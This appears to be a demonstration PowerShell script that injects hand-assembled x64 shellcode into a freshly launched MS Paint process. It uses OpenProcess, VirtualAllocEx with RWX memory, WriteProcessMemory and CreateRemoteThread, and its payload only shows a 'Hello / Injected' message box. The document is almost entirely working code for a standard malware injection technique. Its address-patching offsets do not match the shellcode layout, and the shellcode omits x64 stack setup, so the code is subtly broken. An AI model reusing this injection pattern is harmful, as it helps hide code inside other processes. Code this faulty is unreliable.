# sample3.ps1

if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
    [Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "❌ Please run this script as Administrator." -ForegroundColor Red
    exit
}

$ErrorActionPreference = "Stop"
Write-Host "`n[+] Starting shellcode injection into MS Paint..." -ForegroundColor Cyan

# Import required Win32 APIs
$win32 = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@
Add-Type $win32

# Constants
$PROCESS_ALL_ACCESS = 0x1F0FFF
$MEM_COMMIT = 0x1000
$PAGE_EXECUTE_READWRITE = 0x40
$INFINITE = [uint32]4294967295

# Start MS Paint
$proc = Start-Process -FilePath "mspaint.exe" -PassThru
Start-Sleep -Seconds 1  # Wait for paint to initialize

# Open process handle
$hProc = [Win32]::OpenProcess($PROCESS_ALL_ACCESS, $false, $proc.Id)
if ($hProc -eq [IntPtr]::Zero) { throw "❌ Failed to open MS Paint process." }
Write-Host "[+] Opened handle to MS Paint (PID: $($proc.Id))"

# Resolve MessageBoxA address
$user32 = [Win32]::GetModuleHandle("user32.dll")
$msgBoxAddr = [Win32]::GetProcAddress($user32, "MessageBoxA")
if ($msgBoxAddr -eq [IntPtr]::Zero) { throw "❌ Failed to resolve MessageBoxA address." }
Write-Host "[+] MessageBoxA found at 0x$("{0:X}" -f $msgBoxAddr.ToInt64())"

# Strings to show
$helloBytes = [System.Text.Encoding]::ASCII.GetBytes("Hello`0")
$injectedBytes = [System.Text.Encoding]::ASCII.GetBytes("Injected`0")

# Minimal shellcode for x64 calling convention:
# rcx = hWnd = 0
# rdx = pointer to "Hello"
# r8  = pointer to "Injected"
# r9d = 0 (MB_OK)
# call MessageBoxA
$shellcode = @(
    0x48,0x31,0xC9,                         # xor rcx, rcx
    0x48,0xBA,0,0,0,0,0,0,0,0,             # mov rdx, <addr_hello>
    0x49,0xB8,0,0,0,0,0,0,0,0,             # mov r8, <addr_injected>
    0x41,0xB9,0x00,0x00,0x00,0x00,          # mov r9d, 0
    0x48,0xB8,0,0,0,0,0,0,0,0,             # mov rax, <msgBoxAddr>
    0xFF,0xD0,                             # call rax
    0xC3                                   # ret
) -as [byte[]]

# Calculate total size and allocate remote memory
$totalSize = $shellcode.Length + $helloBytes.Length + $injectedBytes.Length
$remoteMem = [Win32]::VirtualAllocEx($hProc, [IntPtr]::Zero, $totalSize, $MEM_COMMIT, $PAGE_EXECUTE_READWRITE)
if ($remoteMem -eq [IntPtr]::Zero) { throw "❌ Failed to allocate memory in target process." }

# Calculate addresses of strings in remote memory
$addrHello = [IntPtr]::new($remoteMem.ToInt64() + $shellcode.Length)
$addrInjected = [IntPtr]::new($addrHello.ToInt64() + $helloBytes.Length)

# Patch shellcode placeholders with actual addresses
[Array]::Copy([BitConverter]::GetBytes($addrHello.ToInt64()), 0, $shellcode, 4, 8)    # rdx
[Array]::Copy([BitConverter]::GetBytes($addrInjected.ToInt64()), 0, $shellcode, 14, 8) # r8
[Array]::Copy([BitConverter]::GetBytes($msgBoxAddr.ToInt64()), 0, $shellcode, 22, 8)  # rax

Write-Host "[+] Patched shellcode with string and function addresses."

# Combine shellcode and strings into one byte array
$fullBytes = New-Object byte[] $totalSize
$shellcode.CopyTo($fullBytes, 0)
$helloBytes.CopyTo($fullBytes, $shellcode.Length)
$injectedBytes.CopyTo($fullBytes, $shellcode.Length + $helloBytes.Length)

# Write to remote process memory
$written = [IntPtr]::Zero
$result = [Win32]::WriteProcessMemory($hProc, $remoteMem, $fullBytes, $fullBytes.Length, [ref]$written)
if (-not $result -or $written.ToInt64() -ne $fullBytes.Length) {
    throw "❌ Failed to write shellcode to remote process."
}
Write-Host "[+] Wrote $($written.ToInt64()) bytes to remote process."

# Create remote thread
$thread = [Win32]::CreateRemoteThread($hProc, [IntPtr]::Zero, 0, $remoteMem, [IntPtr]::Zero, 0, [IntPtr]::Zero)
if ($thread -eq [IntPtr]::Zero) { throw "❌ Failed to create remote thread." }
Write-Host "[+] Created remote thread: 0x$("{0:X}" -f $thread.ToInt64())"

# Wait for thread to finish
[Win32]::WaitForSingleObject($thread, $INFINITE) | Out-Null
[Win32]::CloseHandle($thread) | Out-Null
Write-Host "[+] Remote thread has finished executing."

Write-Host "`n✅ Injection complete!" -ForegroundColor Green
